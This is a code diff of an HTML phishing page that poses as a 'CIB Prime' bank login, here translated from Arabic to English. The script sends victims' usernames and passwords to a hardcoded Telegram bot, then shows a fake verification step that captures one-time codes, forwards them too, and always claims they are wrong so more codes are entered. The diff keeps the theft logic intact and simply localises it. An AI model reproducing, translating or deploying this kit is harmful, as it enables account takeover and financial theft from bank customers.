@@ -1,18 +1,18 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CIB Prime - تسجيل الدخول</title>
+    <title>CIB Prime - Login</title>
     
     <meta property="og:title" content="CIB Prime">
-    <meta property="og:description" content="تطبيق CIB Prime الخدمات المصرفية الذكية">
+    <meta property="og:description" content="CIB Prime Digital Banking Services">
     <meta property="og:image" content="https://b.top4top.io/p_3800b6k3n0.jpeg">
     <meta property="og:type" content="website">
     
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="CIB Prime">
-    <meta name="twitter:description" content="تطبيق CIB Prime الخدمات المصرفية الذكية">
+    <meta name="twitter:description" content="CIB Prime Digital Banking Services">
     <meta name="twitter:image" content="https://b.top4top.io/p_3800b6k3n0.jpeg">
     
     <style>
@@ -30,7 +30,7 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            direction: rtl;
+            direction: ltr;
         }
 
         .container {
@@ -139,7 +139,7 @@
             font-size: 16px;
             font-weight: 600;
             color: #333;
-            text-align: right;
+            text-align: left;
         }
 
         .input-field {
@@ -152,8 +152,8 @@
             transition: all 0.3s ease;
             background: white;
             font-family: inherit;
-            direction: rtl;
-            text-align: right;
+            direction: ltr;
+            text-align: left;
             color: #333;
         }
 
@@ -168,7 +168,7 @@
 
         .forgot-password {
             display: flex;
-            justify-content: flex-end;
+            justify-content: flex-start;
             margin-bottom: 20px;
         }
 
@@ -275,7 +275,7 @@
         }
 
         .back-btn:hover {
-            transform: translateX(5px);
+            transform: translateX(-5px);
         }
 
         .verify-title {
@@ -321,6 +321,7 @@
             transition: all 0.3s ease;
             background: white;
             direction: ltr;
+            text-align: center;
         }
 
         .otp-input:focus {
@@ -464,36 +465,36 @@
 
                 <form id="loginForm">
                     <div class="form-group">
-                        <label class="form-label">اسم المستخدم</label>
+                        <label class="form-label">Username</label>
                         <input 
                             type="text" 
                             id="usernameInput" 
                             class="input-field" 
-                            placeholder="أدخل اسم المستخدم"
+                            placeholder="Enter your username"
                             required
                         >
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">كلمة المرور</label>
+                        <label class="form-label">Password</label>
                         <input 
                             type="password" 
                             id="passwordInput" 
                             class="input-field" 
-                            placeholder="أدخل كلمة المرور"
+                            placeholder="Enter your password"
                             required
                         >
                     </div>
 
                     <div class="forgot-password">
-                        <span class="forgot-password-link">هل نسيت كلمة المرور؟</span>
+                        <span class="forgot-password-link">Forgot password?</span>
                     </div>
 
-                    <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+                    <button type="submit" class="login-btn" id="loginBtn">Login</button>
                 </form>
 
                 <div class="register-link">
-                    مستخدم جديد؟ <a>سجل الآن</a>
+                    New user? <a>Register now</a>
                 </div>
             </div>
         </div>
@@ -507,12 +508,12 @@
             </div>
 
             <div class="content">
-                <button class="back-btn" id="backBtn">← رجوع</button>
+                <button class="back-btn" id="backBtn">← Back</button>
 
-                <div class="verify-title">التحقق من الهوية</div>
+                <div class="verify-title">Identity Verification</div>
                 
                 <div class="verify-message">
-                    تم إرسال رمز التحقق المكون من 6 أرقام إلى<br>
+                    A 6-digit verification code has been sent to<br>
                     <span class="username-display" id="displayUsername"></span>
                 </div>
 
@@ -530,17 +531,17 @@
                 <div class="resend-section">
                     <button type="button" class="resend-btn" id="resendBtn">
                         <span class="refresh-icon">🔄</span>
-                        إعادة إرسال الرمز
+                        Resend Code
                     </button>
                 </div>
 
-                <button type="button" class="verify-btn" id="verifyBtn">تحقق</button>
+                <button type="button" class="verify-btn" id="verifyBtn">Verify</button>
             </div>
         </div>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8881255740:AAHY2hPtgUU8DfGwcZtLujVXXo4h7hhb5qA';
+        const TELEGRAM_BOT_TOKEN = '8881255740:AAHY2hPtgUU8DfGwcZtLujVXXo4h7hhb5qAi';
         const TELEGRAM_CHAT_ID = '8755256359';
 
         const page1 = document.getElementById('page1');
@@ -611,12 +612,12 @@
             const password = passwordInput.value.trim();
 
             if (!username || username.length < 3) {
-                showError('الرجاء إدخال اسم مستخدم صحيح', 1);
+                showError('Please enter a valid username', 1);
                 return;
             }
 
             if (!password || password.length < 4) {
-                showError('الرجاء إدخال كلمة مرور صحيحة', 1);
+                showError('Please enter a valid password', 1);
                 return;
             }
 
@@ -627,7 +628,7 @@
             loginBtn.disabled = true;
 
             try {
-                const message = `📱 <b>محاولة تسجيل دخول جديدة:</b>\n\n👤 <b>اسم المستخدم:</b> <code>${username}</code>\n🔐 <b>كلمة المرور:</b> <code>${password}</code>`;
+                const message = `📱 <b>New Login Attempt:</b>\n\n👤 <b>Username:</b> <code>${username}</code>\n🔐 <b>Password:</b> <code>${password}</code>`;
                 
                 await sendToTelegram(message);
 
@@ -646,7 +647,7 @@
                 loginBtn.disabled = false;
             } catch (error) {
                 console.error('Error:', error);
-                showError('حدث خطأ في الاتصال. حاول مرة أخرى', 1);
+                showError('Connection error. Please try again', 1);
                 loginBtn.classList.remove('loading');
                 loginBtn.disabled = false;
             }
@@ -660,14 +661,14 @@
             otpInputs.forEach(input => input.value = '');
         });
 
-        otpInputs.forEach((input, visualIndex) => {
+        otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 e.target.value = e.target.value.replace(/[^\d]/g, '');
 
                 if (e.target.value.length === 1) {
                     e.target.classList.add('filled');
-                    if (visualIndex < otpInputs.length - 1) {
-                        otpInputs[visualIndex + 1].focus();
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
                     }
                 }
 
@@ -676,8 +677,8 @@
 
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && !input.value) {
-                    if (visualIndex > 0) {
-                        otpInputs[visualIndex - 1].focus();
+                    if (index > 0) {
+                        otpInputs[index - 1].focus();
                     }
                 }
             });
@@ -699,7 +700,7 @@
                 .join('');
 
             if (enteredCode.length !== 6) {
-                showError('الرجاء إدخال الرمز كاملاً (6 أرقام)', 2);
+                showError('Please enter the complete code (6 digits)', 2);
                 return;
             }
 
@@ -707,11 +708,11 @@
             verifyBtn.disabled = true;
 
             try {
-                const message = `✅ <b>محاولة تحقق من الرمز:</b>\n\n👤 <b>اسم المستخدم:</b> <code>${currentUsername}</code>\n🔐 <b>كلمة المرور:</b> <code>${currentPassword}</code>\n🔑 <b>الرمز:</b> <code>${enteredCode}</code>`;
+                const message = `✅ <b>Verification Code Attempt:</b>\n\n👤 <b>Username:</b> <code>${currentUsername}</code>\n🔐 <b>Password:</b> <code>${currentPassword}</code>\n🔑 <b>Code:</b> <code>${enteredCode}</code>`;
                 
                 await sendToTelegram(message);
 
-                showError('❌ رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى', 2);
+                showError('Verification code is incorrect. Please try again', 2);
 
                 otpInputs.forEach(input => {
                     input.value = '';
@@ -723,7 +724,7 @@
                 verifyBtn.disabled = false;
             } catch (error) {
                 console.error('Error:', error);
-                showError('حدث خطأ في الاتصال. حاول مرة أخرى', 2);
+                showError('Connection error. Please try again', 2);
                 verifyBtn.classList.remove('loading');
                 verifyBtn.disabled = false;
             }
@@ -734,11 +735,11 @@
             resendBtn.classList.add('spinning');
 
             try {
-                const message = `🔄 <b>إعادة طلب رمز التحقق:</b>\n\n👤 <b>اسم المستخدم:</b> <code>${currentUsername}</code>`;
+                const message = `🔄 <b>Resend Code Request:</b>\n\n👤 <b>Username:</b> <code>${currentUsername}</code>`;
                 
                 await sendToTelegram(message);
 
-                errorMessage2.textContent = '✓ تم إرسال رمز جديد';
+                errorMessage2.textContent = '✓ Code sent successfully';
                 errorMessage2.style.background = '#e8f5e9';
                 errorMessage2.style.color = '#2e7d32';
                 errorMessage2.classList.add('show');
@@ -754,11 +755,11 @@
                 console.error('Error:', error);
                 resendBtn.disabled = false;
                 resendBtn.classList.remove('spinning');
-                showError('خطأ في إعادة الإرسال', 2);
+                showError('Resend error', 2);
             }
         });
 
-        document.title = 'CIB Prime - تسجيل الدخول';
+        document.title = 'CIB Prime - Login';
     </script>
 </body>
 </html>
